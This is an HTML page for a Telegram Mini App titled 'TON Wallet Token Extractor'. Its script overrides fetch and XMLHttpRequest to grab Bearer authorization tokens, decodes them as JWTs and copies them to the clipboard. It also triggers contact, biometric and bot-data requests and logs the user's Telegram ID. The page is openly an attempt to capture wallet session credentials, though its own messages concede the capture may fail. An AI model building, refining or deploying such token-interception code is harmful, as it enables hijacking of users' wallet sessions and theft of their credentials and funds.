<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>TON Wallet Token Extractor</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: Arial;
      text-align: center;
      padding: 2rem;
      background: var(--tg-theme-bg-color, #fff);
      color: var(--tg-theme-text-color, #000);
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      background: var(--tg-theme-button-color, #0088cc);
      color: var(--tg-theme-button-text-color, #fff);
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin: 10px;
    }
    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    #log {
      margin-top: 20px;
      text-align: left;
      padding: 10px;
      background: var(--tg-theme-secondary-bg-color, #f0f0f0);
      border-radius: 8px;
      word-wrap: break-word;
      font-size: 12px;
      max-height: 400px;
      overflow-y: auto;
    }
    .success { color: green; font-weight: bold; }
    .error { color: red; font-weight: bold; }
  </style>
</head>
<body>
  <h2>TON Wallet Token Extractor</h2>
  <button id="triggerAPI">Trigger Wallet API Call</button>
  <button id="getToken" disabled>Show Captured Token</button>
  <pre id="log">Ready...</pre>

  <script>
    const log = document.getElementById('log');
    const triggerBtn = document.getElementById('triggerAPI');
    const getTokenBtn = document.getElementById('getToken');
    const tg = window.Telegram.WebApp;

    tg.ready();
    tg.expand();

    let capturedTokens = [];

    function appendLog(message, type = 'info') {
      const timestamp = new Date().toLocaleTimeString();
      const className = type === 'success' ? 'success' : type === 'error' ? 'error' : '';
      log.innerHTML += `<div class="${className}">[${timestamp}] ${message}</div>`;
      log.scrollTop = log.scrollHeight;
    }

    // INTERCEPT EVERYTHING - including Telegram's internal calls
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
      const [url, options] = args;
      
      appendLog(`📡 Fetch: ${typeof url === 'string' ? url : url.url}`);
      
      if (options?.headers) {
        const headers = options.headers instanceof Headers ? 
          Object.fromEntries(options.headers.entries()) : options.headers;
        
        // Log ALL headers
        Object.entries(headers).forEach(([key, value]) => {
          if (key.toLowerCase() === 'authorization') {
            appendLog(`  🔑 ${key}: ${value}`, 'success');
            if (value.startsWith('Bearer ')) {
              const token = value.replace('Bearer ', '');
              capturedTokens.push({ token, url, timestamp: Date.now() });
              appendLog('🎯 BEARER TOKEN CAPTURED!', 'success');
              getTokenBtn.disabled = false;
            }
          }
        });
      }
      
      return originalFetch.apply(this, args);
    };

    // Intercept XHR
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSetHeader = XMLHttpRequest.prototype.setRequestHeader;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url) {
      this._method = method;
      this._url = url;
      appendLog(`📡 XHR: ${method} ${url}`);
      return originalXHROpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
      if (header.toLowerCase() === 'authorization') {
        appendLog(`  🔑 ${header}: ${value}`, 'success');
        if (value.startsWith('Bearer ')) {
          const token = value.replace('Bearer ', '');
          capturedTokens.push({ token, url: this._url, timestamp: Date.now() });
          appendLog('🎯 BEARER TOKEN CAPTURED!', 'success');
          getTokenBtn.disabled = false;
        }
      }
      return originalXHRSetHeader.apply(this, arguments);
    };

    appendLog('✓ Network interception active', 'success');
    appendLog('Monitoring ALL network traffic...\n');

    // Trigger actual Telegram API calls
    triggerBtn.onclick = async () => {
      try {
        appendLog('=== Triggering Telegram API Calls ===\n');
        
        // Method 1: Cloud Storage (makes authenticated API calls)
        appendLog('1. Testing CloudStorage API...');
        if (tg.CloudStorage) {
          tg.CloudStorage.setItem('test_key', 'test_value', (error, success) => {
            if (error) {
              appendLog(`CloudStorage error: ${error}`, 'error');
            } else {
              appendLog('✓ CloudStorage API called', 'success');
            }
          });
          
          setTimeout(() => {
            tg.CloudStorage.getItem('test_key', (error, value) => {
              if (!error) {
                appendLog(`✓ CloudStorage retrieved: ${value}`, 'success');
              }
            });
          }, 1000);
        }
        
        // Method 2: Request contact/phone (wallet related)
        setTimeout(() => {
          appendLog('\n2. Requesting contact access...');
          tg.requestContact((granted) => {
            if (granted) {
              appendLog('✓ Contact access granted', 'success');
            }
          });
        }, 2000);
        
        // Method 3: BiometricManager (triggers auth APIs)
        setTimeout(() => {
          appendLog('\n3. Testing BiometricManager...');
          if (tg.BiometricManager) {
            tg.BiometricManager.init(() => {
              appendLog('✓ BiometricManager initialized', 'success');
            });
          }
        }, 3000);
        
        // Method 4: Request write access + sendData (definitely makes API call)
        setTimeout(() => {
          appendLog('\n4. Sending data to bot...');
          tg.sendData(JSON.stringify({
            action: 'get_wallet_info',
            user_id: tg.initDataUnsafe.user?.id
          }));
          appendLog('✓ Data sent to bot', 'success');
        }, 4000);

        appendLog('\n⏳ Waiting for API responses...');
        appendLog('Any Bearer tokens will appear above\n');

      } catch (e) {
        appendLog(`Error: ${e.message}`, 'error');
      }
    };

    // Display captured tokens
    getTokenBtn.onclick = async () => {
      try {
        if (capturedTokens.length === 0) {
          appendLog('⚠️ No tokens captured yet!', 'error');
          appendLog('\nThe Wallet API might be using a different auth method');
          appendLog('or running in an isolated context.');
          return;
        }

        appendLog('\n═══════════════════════════════', 'success');
        appendLog(`✓ ${capturedTokens.length} TOKEN(S) CAPTURED!`, 'success');
        appendLog('═══════════════════════════════\n', 'success');
        
        capturedTokens.forEach((capture, i) => {
          appendLog(`\nToken #${i + 1}:`);
          appendLog(`URL: ${capture.url}`);
          appendLog(`Time: ${new Date(capture.timestamp).toLocaleTimeString()}`);
          appendLog(`Token: ${capture.token}\n`);
          
          // Try JWT decode
          try {
            const parts = capture.token.split('.');
            if (parts.length === 3) {
              const payload = JSON.parse(atob(parts[1]));
              appendLog('JWT Payload:');
              appendLog(JSON.stringify(payload, null, 2));
            }
          } catch (e) {
            appendLog('(Non-JWT token)');
          }
        });

        const latestToken = capturedTokens[capturedTokens.length - 1].token;
        await navigator.clipboard.writeText(latestToken);
        tg.showAlert('✓ Latest token copied!');
        appendLog('\n✓ Copied to clipboard!', 'success');

      } catch (e) {
        appendLog(`Error: ${e.message}`, 'error');
      }
    };

    // Auto-log Telegram WebApp info
    appendLog('Telegram WebApp Info:');
    appendLog(`Version: ${tg.version}`);
    appendLog(`Platform: ${tg.platform}`);
    appendLog(`User ID: ${tg.initDataUnsafe.user?.id}`);
    appendLog(`\nClick "Trigger Wallet API Call" to start\n`);
    
  </script>
</body>
</html>